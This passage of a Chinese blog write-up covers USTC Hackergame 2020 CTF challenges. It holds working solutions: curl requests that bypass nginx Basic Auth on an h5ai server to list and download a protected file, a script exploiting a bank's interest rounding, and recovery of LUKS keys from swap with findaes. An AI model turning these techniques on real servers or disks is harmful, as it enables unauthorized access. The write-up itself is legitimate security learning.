Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>\"Send from Arctic.\" 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊......话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>......</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There's no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/20.png\" width=\"829\" height=\"601\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.0/32.png\" width=\"1067\" height=\"247\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/6.png\" width=\"1009\" height=\"593\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/7.png\" width=\"988\" height=\"581\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/13.png\" width=\"782\" height=\"905\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/15.png\" width=\"690\" height=\"94\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>......<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.8/29.png\" width=\"1497\" height=\"412\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完.....吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/27.png\" width=\"1150\" height=\"420\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/28.png\" width=\"1146\" height=\"539\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏......」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/18.png\" width=\"824\" height=\"864\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>...... 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 ... 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 ... 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/9.png\" width=\"1165\" height=\"294\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/8.png\" width=\"750\" height=\"400\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/10.png\" width=\"1196\" height=\"270\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/11.png\" width=\"687\" height=\"514\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/12.png\" width=\"1371\" height=\"279\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 